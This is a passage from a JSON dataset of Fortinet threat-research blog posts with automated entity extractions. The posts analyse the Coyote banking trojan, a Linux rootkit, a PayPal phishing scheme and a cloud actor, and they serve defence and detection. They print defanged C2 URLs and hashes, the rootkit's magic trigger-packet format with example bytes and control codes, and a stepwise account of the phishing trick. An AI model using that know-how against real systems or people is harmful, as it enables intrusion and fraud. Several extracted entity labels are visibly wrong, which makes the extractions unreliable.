CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack. The injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack’s next stage. The decrypted MSIL execution file first establishes persistence by modifying the registry at “HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is “hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.” If the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a “|” separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: “hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).” After setting and checking in, it calls “CreateProcess” to execute the PowerShell command that was added into the registry to invoke the payload: The payload “vxewhcacbfqnsw” is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan. We obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions: Length Description 10 Disconnect from server 11 Terminate program 12 Take screenshot as image/jpeg 13 Get a window's title bar text 14 Activate a window and restore it to its original size 15 Minimize a window 16 Activate a window and restore it to its normal size then display it as a maximized window 17 Kill targeted process 18 Show full-screen overlay 19 Restore a window and then maximize it 20 Remove the window handle 21 Shut down the device 22 Enable the Desktop Window Manager composition feature then shut down the device 23 Click mouse at a specific screen position 24 Copy a string to the clipboard and then simulate typing that string 25 Send the specified keys to the active application. If a key contains a ‘+,’ it is sent as an uppercase character; otherwise, it is sent as a lowercase character. 26 Disable DWM composition 27 Display the fake image for a specific target with a message. For example: “Trabalhando nas atualiza” (Working on updates), “Aponte a câmera para a imagem a seguir” (Point the camera at the following image) 28 Cleanup, unhook, and stop current monitoring 29 Control user-visible windows, close the window 30 Adjust the opacity 31 Enable keylogger or send the keylogger’s result with separator ‘¾’ 32 N/A 33 Simulate key presses to perform automated navigation actions: {UP}, {RIGHT}, {DOWN}, and {LEFT} 34 Manipulate display settings 35 Send the given keys Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets. Consequently, it highlights the critical need for robust security measures for both individuals and institutions to safeguard against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent.D!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web FilteringService blocks the C2 server. We also suggest that organizations go through Fortinet’s free cybersecurity training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://btee[.]geontrigame[.]com/mvkrouhawmjxxps://qmnw[.]daowsistem[.]com/fayikyeundhxxps://bhju[.]daowsistem[.]com/iwywybzqxkhxxps://lgfd[.]daowsistem[.]com/riqojhyvnrhxxps://leme[.]daowsistem[.]com/omzowcicwphxxps://igow[.]scortma[.]com/fqieghffbmhxxps://quit[.]scortma[.]com/xzcpnnfhxihxxps://llue[.]geontrigame[.]com/byyyfydxyfhxxps://cxmp[.]scortma[.]com/qfutdbtqquhxxps://xrxw[.]scortma[.]com/gmdroacyvihxxps://qfab[.]geontrigame[.]com/vfofnzihsmhxxps://tbet[.]geontrigame[.]com/zxchzzmismhxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw geraatualiza[.]commasterdow[.]comgeraupdate[.]com 362af8118f437f9139556c59437544ae1489376dc4118027c24c8d5ce4d84e48330dffe834ebbe4042747bbe00b4575629ba8f2507bccf746763cacf63d655bb33cba89eeeaf139a798b7fa07ff6919dd0c4c6cf4106b659e4e56f15b5809287552d53f473096c55a3937c8512a06863133a97c3478ad6b1535e1976d1e0d45f64209e2348e6d503ee518459d0487d636639fa5e5298d28093a5ad41390ef6b067f371a683b2be4c8002f89492cd29d96dceabdbfd36641a27be761ee64605b173ad6be67691b65cee251d098f2541eef3cab2853ad509dac72d8eff5bd85bc07cbfbce482071c6df823f09d83c6868d0b1208e8ceb70147b64c52bb8b48bdb8839de445f714a32f36670b590eba7fc68b1115b885ac8d689d7b344189521012bea4f753707eba4088e8a51818d9de8e9ad0138495338402f05c5c7a800695a6f3c37b1de5983b30b9ae70c525f97727a56d3874533db1a6e3dc1355bfbf37ecfd0ef425d34b56d0bc08bd93e6ecb11541bd834b9d4d417187373b17055c862e Cara Lin,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Windows, Operating System), (Coyote Banking Trojan, Malware), (Brazil, Country), (keylogging, Technique), (capturing screenshots, Technique), (displaying phishing overlays, Technique), (stealing sensitive credentials, Technique), (ZBX, Domain), (Geonet, Domain), (TBET, Domain), (GEO, Domain), (GameTrigame, Domain), (ZXCHZZMISM, Domain), (PSSGR, Tool), (PSHR, Tool), (IEX, Tool), (iwr, Tool), (Uri, Tool), (hxxps://tbet[.]geontrigame[.]com/zxchzzmism, URL), (Start-Job, Tool), (Bypass, Technique), (Start-Sleep, Technique), (131, Number), (Operating System, OS), (Machine ID, Identifier), (Global Threat Landscape Report, Report), (Action Plan, Action)\nRelationships: (FortiGuard Labs, uses, Windows), (Windows, impactedBy, Coyote Banking Trojan), (Coyote Banking Trojan, targets, Brazil), (Coyote Banking Trojan, uses, ZBX), (Coyote Banking Trojan, uses, Geonet), (Coyote Banking Trojan, uses, TBET), (Coyote Banking Trojan, uses, GEO), (Coyote Banking Trojan,",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Windows",
          "Operating System"
        ],
        [
          "Coyote Banking Trojan",
          "Malware"
        ],
        [
          "Brazil",
          "Country"
        ],
        [
          "keylogging",
          "Technique"
        ],
        [
          "capturing screenshots",
          "Technique"
        ],
        [
          "displaying phishing overlays",
          "Technique"
        ],
        [
          "stealing sensitive credentials",
          "Technique"
        ],
        [
          "ZBX",
          "Domain"
        ],
        [
          "Geonet",
          "Domain"
        ],
        [
          "TBET",
          "Domain"
        ],
        [
          "GEO",
          "Domain"
        ],
        [
          "GameTrigame",
          "Domain"
        ],
        [
          "ZXCHZZMISM",
          "Domain"
        ],
        [
          "PSSGR",
          "Tool"
        ],
        [
          "PSHR",
          "Tool"
        ],
        [
          "IEX",
          "Tool"
        ],
        [
          "iwr",
          "Tool"
        ],
        [
          "Uri",
          "Tool"
        ],
        [
          "hxxps://tbet[.]geontrigame[.]com/zxchzzmism",
          "URL"
        ],
        [
          "Start-Job",
          "Tool"
        ],
        [
          "Bypass",
          "Technique"
        ],
        [
          "Start-Sleep",
          "Technique"
        ],
        [
          "131",
          "Number"
        ],
        [
          "Operating System",
          "OS"
        ],
        [
          "Machine ID",
          "Identifier"
        ],
        [
          "Global Threat Landscape Report",
          "Report"
        ],
        [
          "Action Plan",
          "Action"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "uses",
          "Windows"
        ],
        [
          "Windows",
          "impactedBy",
          "Coyote Banking Trojan"
        ],
        [
          "Coyote Banking Trojan",
          "targets",
          "Brazil"
        ],
        [
          "Coyote Banking Trojan",
          "uses",
          "ZBX"
        ],
        [
          "Coyote Banking Trojan",
          "uses",
          "Geonet"
        ],
        [
          "Coyote Banking Trojan",
          "uses",
          "TBET"
        ],
        [
          "Coyote Banking Trojan",
          "uses",
          "GEO"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 28,
    "relationship_count": 7
  },
  {
    "title": "Deep Dive Into a Linux Rootkit Malware",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:CentOS LinuxImpacted parties:CentOS UsersImpact:Full remote control of a victim’s deviceSeverity level:Critical This is a follow-up analysis to a previous blog about azero day exploitwhere the FortiGuard Incident Response (FGIR) team examined how remote attackers exploited multiple vulnerabilities in an appliance to gain control of a customer’s system. At the end of that blog, we revealed that the remote attacker had deployed a rootkit (a loadable kernel module, sysinitd.ko) and a user-space binary file (sysinitd) on the affected system by executing a shell script (Install.sh). Additionally, to establish rootkit persistence, entries for the rootkit malware were added in the /etc/rc.local and /etc/rc.d/rc.local files so the rootkit malware is loaded during system startup. During our analysis of the image of the compromised device, we found that its Linux audit logs contained user-space shell commands executed by the Threat Actor on the appliance. The executed shell commands were stored as hexadecimal blobs in the audit logs.  One of the log entries found was as follows: 2024-09-07 03:26:18 When decoded, the hexadecimal resulted in a base64-encoded blob. Decoding the base64 blob produced a tgz file, which, upon decompression, produced the following two files. Analysis ofinstall.sh, which is an injector script, reveals that as a default, it installs a shareable object,sysinitd.so, in the location/usr/share/empty/. Pivoting from this, the FGIR team analyzed the image of the compromised Ivanti box and retrieved two malicious files created by the Threat Actor on the disk in the location/usr/share/empty/. One of the two files was the rootkit—the malicious kernel modulesysinitd.so, which is referred to as sysinitd.ko in this analysis. FortiGuard conducted an in-depth analysis of the malicious rootkit malware. This analysis reveals how the kernel module hijacks the inbound network traffic to the compromised Ivanti system, how the user-space malicious file is started, and how it communicates with the rootkit module. The analysis also sheds light on the overall purpose of the rootkit malware. The command “readelf –h sysinitd.ko” displays the kernel module's ELF (Executable and Linkable Format) file header information, as shown in Figure 1. Its ELF type is “REL (Relocatable file),” which is the expected type for the kernel modules. The kernel module is loaded and starts functioning after executing the command “insmod /usr/share/empty/init/sysinitd.ko,” as shown in Figure 2. When the kernel module is inserted into the kernel, its init_module() function is called. It performs some initialization tasks, such as setting values to some global variables, decrypting strings, registering a network hook function, creating file descriptors under the “/proc” folder, and more. Figure 3 illustrates how it decrypts the encrypted string by calling a function. In this example, the string “abrtinfo” has just been decrypted. It will be used later when creating procfs (process filesystem) entries. Next, the kernel module calls the kernel API, nf_register_hook(), to register a Netfilter hook. Figure 4 shows the contextual ASM instructions for calling nf_register_hook(). The API only takes the structure “nf_hook_ops” as its argument, which specifies a hook function, hook number, priority, and protocol family. The hook callback function is “network_hook_func_15()”(in Figure 4). The protocol family for the IPv4 protocol is 2. The hook number is 0 for NF_INET_PRE_ROUTING, a hook point in the Linux kernel's Netfilter framework where incoming packets are intercepted before any routing decision is made. This is typically the first point where packets are intercepted after they arrive in the system. One of the two files was the rootkit, which lists all the available values for the hook number option and their descriptions: Value Macro Description 0 NF_INET_PRE_ROUTING Packet received, before routing decision. 1 NF_INET_LOCAL_IN Packet destined for the local machine, after routing. 2 NF_INET_FORWARD Packet being forwarded to another machine. 3 NF_INET_LOCAL_OUT Packet originating from the local machine, before routing. 4 NF_INET_POST_ROUTING Packet after routing, ready for transmission. Afterward, the init_module() function of the kernel module (sysinitd.ko) creates three procfs entries in the folder “/proc/” using the kernel API proc_create_data(). The names of the procfs entries are taken from the string “abrtinfo” decrypted earlier. The following ASM instruction snippet demonstrates the creation of the three procfs entries. […] .text:023D6xorr8d, r8d .text:023D9movrcx, offset as_STDIN_FD .text:023E0xoredx, edx .text:023E2movesi, 1B6h; \"RW-RW-RW-\" .text:023E7movrdi, offset byte_3275; \"abrtinfo\" .text:023EEcallproc_create_data .text:023F3xorr8d, r8d .text:023F6movrcx, offset as_STDOUT_FD .text:023FDxoredx, edx .text:023FFmovesi, 1B6h; \"RW-RW-RW-\" .text:02404movrdi, offset byte_3276; \"brtinfo\" .text:0240Bmovcs:gv_26, rax .text:02412callproc_create_data .text:02417xorr8d, r8d .text:0241Amovrcx, offset as_control_STDIN_FD .text:02421xoredx, edx .text:02423movesi, 1B6h; \"RW-RW-RW-\" .text:02428movrdi, offset byte_3277; \"rtinfo\" .text:0242Fmovcs:gv_261, rax .text:02436callproc_create_data […] All the procfs entries’ permissions are set as 1B6h, which stands for “rw-rw-rw-,” granting read/write access to all users. Their names are all derived from the string “abrtinfo” but at different offsets: “abrtinfo” at offset 0x3275, “brtinfo” at offset 0x3276 and “rtinfo” at offset 0x3277. Figure 5 shows the three created files. The Install.sh determines whether the kernel module has been successfully loaded by checking whether “/proc/abrtinfo” has been created. We have learned that the three procfs entries act as file descriptors when the user-space process (sysinitd) runs, where “/proc/abrtinfo” will be sysinitd’s stdin, “/proc/brtinfo” will be sysinitd’s stdout, and “/proc/rtinfo” will pass the control commands to sysinitd. In the kernel module, there are many callback functions bound to these procfs entries: Linux calls the Netfilter hook function once the incoming IPv4 packets, UDP and TCP, arrive. The malware focuses solely on the TCP packets (the protocol value is 6). It compares the protocol value of the received packet and ignores non-TCP packets. TCP sessions are established with a three-way handshake. As a result, the attacker must establish a TCP session with the services running on the compromised system, such as HTTP (port 80), HTTPS (443), SSH (22), FTP (21), and more. For the hook function to recognize the packet from the attacker, the attacker must send a special packet to the compromised system (referred to as the attack-init packet (the first packet) in this analysis). The attack-init packet must be 0xd bytes long and in the following format: Offset Length Description 0x00 1 “\\x31” or “\\x30”. A flag to enable or disable encryption for traffic. 0x01 4 Verification data.  “Dw1” 0x05 4 Verification data.  “Dw5” 0x09 4 Verification data.  “Dw9” To get the packet through, it must also meet the following conditions: 1>  Dw1 == Dw9 ^ 0x32C21F0A2> Dw5 == Dw9 ^ 0xED22AF9E or Dw5 == Dw9 ^ 0x4B1EF486 An example of a crafted attack-init packet looks like this: “\\x30”+“\\x3E\\x2B\\xF6\\x06”+”\\xAA\\x9Bx16\\xD9”+”\\x34\\x34\\x34\\x34” Once the attack-init packet is verified, the kernel module records the source IP and Port and, in some global variables, the destination IP and Port. This ensures that subsequent traffic meeting the conditions will be recognized as coming from the attacker and only processed within the Netfilter hook function. Meanwhile, a series of kernel APIs are called, including queue_work_on(), kthread_create_on_node(), wake_up_process(), and call_usermodehelper(). Based on our analysis, these APIs start the user-space file (sysinitd). The call_usermodehelper() API is used in the Linux kernel to execute a user-space program from the kernel space. The function definition is: intcall_usermodehelper(constchar*path,char**argv,char**envp,intwait); According to the ASM instructions in Figure 6, it starts the user-space process with the command line argument “abrtinfo:0.” The path to the process, “/usr/share/empty/init/sysinitd,” is hardcoded in the kernel module. We explain how the user-space process works in the next section. All response packets from the kernel module have the same format, as shown in the table below: Offset Length Description 0x00 4 The size of the payload data. 0x04 Variable Payload data. The payload data is encrypted as long as the first byte in the attack-init packet is “\\x31.” The encryption key is calculated from the verification data in the attack-init packet, which is then returned to the attacker while the attack-init packet is being processed. Figure 7 shows a simulated attack scenario where the attacker (the client) sends an attack-init packet to the compromised system (the server). The rootkit malware verifies the packet, generates an encryption key (4 bytes) from the first packet and other related data, and sends it back to the attacker in a response packet. If the attack-init packet enables the encryption function, the encryption key will be used to encrypt and decrypt the payload data on both the client and server. Otherwise, both sides will discard the encryption key packet. From that point on, the attacker can communicate with the infected system. Incoming packets from the attacker are passed to the user-space process, which reads from “/proc/abrtinfo” via the read callback function. The kernel module also sends back the output of the user-space process when it writes data to “/proc/brtinfo.” Figure 8 shows a pseudo-code example of the read callback function assigned to “/proc/abrtinfo. \" This function calls a kernel API copy_to_user() to copy the attacker’s data to the user-space process (sysinitd). When the attacker sends 4-byte control commands to the compromised system, “/proc/rtinfo” is used to pass the commands to and control the user-space process. Command Action 0xB3FEB404 It passes 0xE1 to “/proc/rinfo”. 0x80CDD03C It passes 0xE2 to “/proc/rinfo”. 0x44724774 It passes 0xE4 to “/proc/rinfo”. The user-space file “sysinitd” was copied to “/usr/share/empty/init” in Install.sh. In reviewing its ELF header information in Figure 9, we find that the ELF type is EXEC, indicating that it is a user-space executable file. The sysinitd process is started by the kernel module. It disguises itself as a bash program by replacing its process name with “bash,” which is a decrypted string. Because of this, the system administrator is unlikely to identify it as malware. It then calls APIs to archive this, like the following C-code: memset(argv[0], 0, sizeof(argv[0])); strcpy(argv[0], “bash”); It then verifies whether its command-line argument is “abrtinfo” using the API strcmp(), as shown in Figure 10. If the command-line argument does not match, the process exits. Next, it invokes the Linux system call “fork()” to create a child process. From this point on, the parent and child processes follow different workflows. After fork() is initiated, it continues to set the current process’s standard input to “/proc/abrtinfo,” standard output, and standard error to “/proc/brtinfo” by invoking three dup2() system calls. Refer to Figure 11 for the corresponding ASM instructions that perform this action. These procfs entries are created in the kernel module. A callback function is assigned to each one, which is called when read or write operations occur. At the bottom of Figure 11, another system call, execv(), is invoked to replace the current process with a specified one, which in this case is “/bin/sh.” The attacker can now remotely execute any command with root privilege on the compromised system through the malicious kernel module (sysinitd.ko) and the child process (sysinitd -> /bin/sh). The parent process now begins performing tasks typically associated with a daemon process, such as managing the child process (e.g., starting, restarting, and killing the child process). It reads control commands from the file descriptor “/proc/rtinfo” and follows the different branches depending on the command values. As indicated in Figure 12, it reads the control command 0xE1. To archive this, the attacker must send this 4-byte packet\"\\x04\\xb4\\xfe\\xb3\". The supported control commands are listed in the following table: Command Action 0xE1 Restarts the child process. 0xE2 Kills the child process. 0xE3 Sends Ctrl+C to the child process. 0xE4 Kills both the child and parent process. Figure 13 is a screenshot of the output of the command “ps aux | grep –e “ sh” –e “bash,” where “sh” is the child process and “bash” is the parent process. Figure 14 illustrates how the attacker controls the compromised system via rootkit malware and the user-space process. We developed a Python script to simulate the attacker controlling the compromised Linux system. By leveraging the Python script to send numerous Linux commands to the compromised system, we can see the communication and command execution results, as shown in Figure 15, which is a Wireshark screenshot of the traffic data. The commands sent to the Linux system are “whoami,” “pwd,” “wget -O Fortinet.html -o summary www.fortinet.com,” and “ls -l fortinet.html.” In this analysis, we focused on the rootkit malware.  We first explained how the kernel module set a Netfilter hook function on NF_INET_PRE_ROUTING to hijack the incoming TCP traffic to the compromised system. Next, we elaborated on what related tasks the Netfilter hook function performs, including how it handles the attacker-init packet and the response packet format, invokes the user-space file, and exchanges data between the user-space process and the kernel module. You also learned how the user-space process is started, how it disguises itself as “bash,” how it creates the child process using a fork() system call, and how it is eventually replaced by “/bin/sh” to process the attacker’s Linux commands to control the system. Finally, we demonstrated how an attacker establishes a connection to a compromised system, sends Linux commands, and retrieves the result through traffic sniffing. Fortinet customers are already protected from this campaign. The FortiGuard Antivirus service detects the malicious files install.sh, sysinitd.ko, and sysinitd as: BASH/Injector.CSA!trELF64/Injector.CSA!trELF64/Injector.CSA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. [install.sh]8D016D02F8FBE25DCE76481A90DD0B48630CE9E74E8C31BA007CF133E48B8526 [sysinitd.ko]6EDD7B3123DE985846A805931CA8EE5F6F7ED7B160144AA0E066967BC7C0423A [sysinitd]D57A2CAC394A778E19CE9B926F2E0A71936510798F30D20F207F2A49B49CE7B1 Reference:Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA linux,malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (CentOS Linux, OS), (CentOS Users, Target), (Linux, OS), (Azero Day Exploit, Threat Type), (Threat Actor, Attacker), (rootkit, Malware), (sysinitd.ko, Tool), (sysinitd, Tool), (Install.sh, File), (etc/rc.local, File), (etc/rc.d/rc.local, File), (audit logs, File), (hexadecimal blobs, File), (base64 encoded blob, File), (tgz file, File), (injector script, File), (usr/share/empty/, Directory)\nRelationships: (FortiGuard Labs Threat Research, affects, CentOS Linux), (CentOS Linux, impactedBy, Azero Day Exploit), (CentOS Users, impactedBy, Azero Day Exploit), (CentOS Users, target, Threat Actor), (Threat Actor, executes, Install.sh), (Install.sh, injects, sysinitd.so), (sysinitd.so, installedIn, /usr/share/empty/)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "CentOS Linux",
          "OS"
        ],
        [
          "CentOS Users",
          "Target"
        ],
        [
          "Linux",
          "OS"
        ],
        [
          "Azero Day Exploit",
          "Threat Type"
        ],
        [
          "Threat Actor",
          "Attacker"
        ],
        [
          "rootkit",
          "Malware"
        ],
        [
          "sysinitd.ko",
          "Tool"
        ],
        [
          "sysinitd",
          "Tool"
        ],
        [
          "Install.sh",
          "File"
        ],
        [
          "etc/rc.local",
          "File"
        ],
        [
          "etc/rc.d/rc.local",
          "File"
        ],
        [
          "audit logs",
          "File"
        ],
        [
          "hexadecimal blobs",
          "File"
        ],
        [
          "base64 encoded blob",
          "File"
        ],
        [
          "tgz file",
          "File"
        ],
        [
          "injector script",
          "File"
        ],
        [
          "usr/share/empty/",
          "Directory"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "affects",
          "CentOS Linux"
        ],
        [
          "CentOS Linux",
          "impactedBy",
          "Azero Day Exploit"
        ],
        [
          "CentOS Users",
          "impactedBy",
          "Azero Day Exploit"
        ],
        [
          "CentOS Users",
          "target",
          "Threat Actor"
        ],
        [
          "Threat Actor",
          "executes",
          "Install.sh"
        ],
        [
          "Install.sh",
          "injects",
          "sysinitd.so"
        ],
        [
          "sysinitd.so",
          "installedIn",
          "/usr/share/empty/"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 7
  },
  {
    "title": "Phish-free PayPal Phishing",
    "link": "https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing",
    "content": "FortiGuard Labs Threat Research As a CISO, I am always on high alert for phishing attempts, and this recent example immediately set off alarm bells. Most obviously, why am I even receiving this request? I don’t use my corporate email address in PayPal. Additionally, the To: address, “Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com,” is not mine. Usually, this would result in a ‘report and move on’ action from me, but I was a little intrigued. Whenever I see a phishing email, I always think, WWMMD (what would my Mum do?). How would I have responded based on all the methods I have told her to look for? Firstly, the sender address appears to be valid and not spoofed. …and the URL looks genuine. At this point, this seems to be a genuine email—at least, my mum might think so. So, what is going on? A genuine email can’t still be a problem, can it? Well, here is the catch in this instance. When you click on the link, you are redirected to a PayPal login page showing a request for payment. A panicked person may be tempted to log in with their account details, but this would be very dangerous. It links your PayPal account address with the address it was sent to—not where you received it. In this case, PayPal thinks it sent this request to Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com The scammer appears to have simply registered an MS365 test domain, which is free for three months, and then created a Distribution List (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) containing victim emails, as shown below: On the PayPal web portal, they simply request the money and add the distribution list as the address: This money request is then distributed to the targeted victims, and the Microsoft365 SRS (Sender Rewrite Scheme) rewrites the sender to, e.g., bounces+SRS=onDJv=S6[@]5ln7g7.onmicrosoft.com, which will pass the SPF/DKIM/DMARC check. Once the panicking victim logs in to see what is going on, the scammer’s account (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) gets linked to the victim’s account. The scammer can then take control of the victim's PayPal account—a neat trick. It’s so neat, in fact, that it would sneak past even PayPal’s own phishing check instructions. The beauty of this attack is that it doesn’t use traditional phishing methods. The email, the URLs, and everything else are perfectly valid. Instead, the best solution is the Human Firewall—someone who has been trained to be aware and cautious of any unsolicited email, regardless of how genuine it may look. This, of course, highlights the need to ensure your workforce is receiving the training they need to spot threats like this to keep themselves—and your organization—safe. This is a perfectly valid email in most ways. However, it is still possible to create a DLP rule to look for multiple conditions that indicate that this email is being sent via a distribution list. The following rule will successfully identify such a case. phishing Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (CISO, Attacker), (Phishing attempt, Threat Type), (PayPal, Tool), (billingdepartments1[@]gkjyryfjy876.onmicrosoft.com, Domain), (MS365 test domain, Domain)\nRelationships: (FortiGuard Labs Threat Research, associatedWith, CISO), (Phishing attempt, targets, billingdepartments1[@]gkjyryfjy876.onmicrosoft.com), (Phishing attempt, resolvesTo, MS365 test domain), (Phishing attempt, communicatedWith, PayPal)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "CISO",
          "Attacker"
        ],
        [
          "Phishing attempt",
          "Threat Type"
        ],
        [
          "PayPal",
          "Tool"
        ],
        [
          "billingdepartments1[@]gkjyryfjy876.onmicrosoft.com",
          "Domain"
        ],
        [
          "MS365 test domain",
          "Domain"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "associatedWith",
          "CISO"
        ],
        [
          "Phishing attempt",
          "targets",
          "billingdepartments1[@]gkjyryfjy876.onmicrosoft.com"
        ],
        [
          "Phishing attempt",
          "resolvesTo",
          "MS365 test domain"
        ],
        [
          "Phishing attempt",
          "communicatedWith",
          "PayPal"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 4
  },
  {
    "title": "Catching \"EC2 Grouper\"- no indicators required!",
    "link": "https://www.fortinet.com/blog/threat-research/catching-ec2-grouper-no-indicators-required",
    "content": "FortiGuard Labs Threat Research Through the years of analyzing identity compromises in the cloud, we’ve seen the same attackers pop up regularly, some more frequently than others. Among the more prolific ones we’ve come to know is one we’ve dubbed “EC2 Grouper”. Over the past couple of years, we’ve seen this actor in several dozen customer environments, making them one of the more active groups we’ve tracked. This usual suspect is attributed by their penchant for using similar user agents and the same security group naming convention in their attacks. Whileindicatorssuch as user agents and even security group names can assist in attribution and hunting, we have found them unreliable for comprehensive threat detection. In this blog, we’ll detail tactics associated with EC2 Grouper and howLacework FortiCNAPPcan be leveraged to detect this threat, among others. More importantly, we will showcase how this is achieved without relying on actor-specific indicators, which can be transient in nature. EC2 Grouper is characterized by their usage of AWS tools for PowerShell to carry out attacks. This is presumed by their user agent, which was consistent for a number of years: AWSPowerShell.Common/4.1.90.0 .NET_Core/6.0.5 OS/Microsoft_Windows_10.0.17763 PowerShellCore/7.-1 ClientAsync In recent attacks, they have updated their UA, which now contains new versioning and unusual # characters, which could indicate a possible detection countermeasure. AWSPowerShell.Common/4.1.534.0 ua/2.0 .NET_Core#6.0.5 OS/windows#10.0.17763.0 md/ARCH#X64 PowerShellCore/7.-1 cfg/retry-mode#legacy md/ClientAsync A more consistent indicator has emerged with a security group naming convention. Attacks in the cloud often leverage the CreateSecurityGroup API (T1098)  to enable remote access and lateral movement in the cloud environment. EC2 Grouper will typically attempt to create multiple groups using the same naming convention of ec2group suffixed with a sequential combination of 1-5. Example request parameters: {\"groupDescription\":\"ec2group\",\"groupName\":\"ec2group\"} {\"groupDescription\":\"ec2group1\",\"groupName\":\"ec2group1\"} {\"groupDescription\":\"ec2group12\",\"groupName\":\"ec2group12\"} {\"groupDescription\":\"ec2group123\",\"groupName\":\"ec2group123\"} {\"groupDescription\":\"ec2group1234\",\"groupName\":\"ec2group1234\"} {\"groupDescription\":\"ec2group12345\",\"groupName\":\"ec2group12345\"} In all instances of EC2 Grouper attacks, cloud activity appears to be largely automated. The attacker will initially make calls to DescribeInstanceTypes to inventory EC2 types within the environment and then DescribeRegions to retrieve information about regions available for resources. Upon acquiring available regions, the following API calls are iteratively executed for every available region: Interestingly, we have never observed calls to AuthorizeSecurityGroupIngress, which is ultimately required to configure inbound access to any EC2 launched with the security group. However, on several occasions, we have observed CreateInternetGateway and CreateVpc, which are required for remote access. To date, we have not observed what could be classified as actions based on objectives or manual activity in a compromised cloud environment. It could be either that EC2 Grouper is selective in their escalation or compromised accounts were detected and quarantined before they had the opportunity to escalate. Despite this, resource hijacking (T1496) is likely the general objective. However, to what end is currently unconfirmed. In every attack involving valid accounts, the credentials must originate from somewhere. One of the more common sources for compromised keys remains code repositories. Developers often mistakenly commit cloud access keys to public repositories. Once this occurs, the clock starts ticking until the credentials fall into the hands of attackers, are discovered by secret scanners, or both. This is believed to be the primary method of credential acquisition for EC2 Grouper, as their cloud attacks are frequently accompanied by attacks from other threat actors. EC2 Grouper, however, is by far the most prolific actor allegedly using this vector. Given the popularity of obtaining credentials in code repositories, it can be prudent to look for legitimate secret scanning services as part of your detection strategy. These include GitGuardian and Github’s secret scanning service.In our composite alerts, we have included secret scanning as a signal, as it is frequently seen in conjunction with illicit credential usage. Of course, credential checking alone does not indicate a compromise, so other signals need to be correlated to reduce false positives. When alerting on EC2 Grouper, our composite alerts have evaluated other techniques, such as using specific APIs known to be leveraged in attacks. These are effectively mapped to the respective techniques with the assistance of the open-sourceTDiscoverproject. Finally, we evaluate anomalies as part of the composite alert. An alleged attack may exhibit characteristics indicative of malicious reconnaissance or privilege escalation. However, it's crucial to confirm this through anomaly detection. Identifying illicit usage of valid credentials in the cloud can be a nuanced and difficult task. This poses a considerable challenge when it comes to detection, as the vast majority of attacks in the cloud involve compromised credentials. While the attack detailed in this blog had various atomic indicators specific to the actors’ tactics and techniques, most attacks do not exhibit these unique characteristics. To achieve higher accuracy, it becomes more critical to correlate weaker signals involving aspects that attackers cannot control. For example, while attackers can easily control their source IP and user agent, theycannotcontrol whether it is anomalous to the environment. Similarly, they cannot control the APIs or sequence of APIs needed to carry out their objectives. By leveraging these as signals to a composite alerting mechanism, one can achieve a much higher level of detection 